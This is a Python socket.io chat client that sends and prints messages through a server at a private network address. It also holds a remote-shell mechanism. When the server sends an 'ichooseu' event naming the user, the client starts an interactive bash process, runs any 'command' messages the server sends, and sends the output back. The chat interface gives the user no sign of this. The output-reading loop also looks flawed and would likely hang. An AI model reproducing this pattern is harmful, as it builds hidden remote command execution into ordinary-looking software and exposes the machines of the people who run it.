import socketio 
import subprocess , time

sio = socketio.Client() 

process = None
choosen = False

@sio.event()
def ichooseu(userid):
    global choosen 
    choosen = True
    global process
    if userid == myuserid:
        print("ichooseu")
        process = subprocess.Popen(
            ["bash","-i"],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            bufsize=1,
            universal_newlines=True
        )
        time.sleep(0.1)
        print("i am here")
        process.stdin.write("echo 'hello world'\n")
        process.stdin.flush()

        process.stdin.write("pwd\n")
        process.stdin.flush()

        output_lines = []
        while True:
            output = process.stdout.readline()  
            if  process.poll() is not None:
                break  
            if output:
                output_lines.append(output.strip())  
                print(output.strip())  
        if sio.connected:
            sio.emit("message", {"userid": userid, "message": "\n".join(output_lines), "type": "rcommand"})

@sio.event()
def connect():
    print("Connected to the server")
    print("------------------------")

@sio.event()
def disconnect():
    print("Disconnected")
    print("------------------------")

@sio.event()
def message(message):
    global process
    if (message['userid']!=myuserid and message["type"]=="message"):
        print(f"{message['userid']}: {message['message']}")
        print("------------------------")
    elif (message['userid']!=myuserid and message["type"]=="status"):
        print(f"{message['userid']} {message['message']}")
        print("------------------------")
    elif (message['userid']==myuserid and message["type"]=="command"):
        print(f"{message['message']}")
        process.stdin.write(message['message'] + "\n")
        process.stdin.flush()

        process.stdin.write("pwd\n")
        process.stdin.flush()

        output_lines = []
        while True:
            output = process.stdout.readline()  
            if output == '' and process.poll() is not None:
                break  
            if output:
                output_lines.append(output.strip()) 
                print(output.strip())  
        if sio.connected:
            sio.emit("message", {"userid": myuserid, "message": "\n".join(output_lines), "type": "rcommand"})


if __name__ == "__main__":
    myuserid = input("enter your userid: ")
    server_address = "http://192.168.1.7:8080"
    sio.connect(server_address)
    sio.emit("connection",myuserid)
    while True:
        message = input()
        print("------------------------")
        json = {"userid":myuserid,"message":message,"type":"message"}
        if message == "exit":
            sio.emit("message",{"userid":myuserid,"message":"left the chat","type":"status"})
            break
        sio.emit("message", json)
    if choosen:
      if process and process.poll() is None:
        process.terminate()
        process.wait()
    sio.disconnect()
    exit(0)
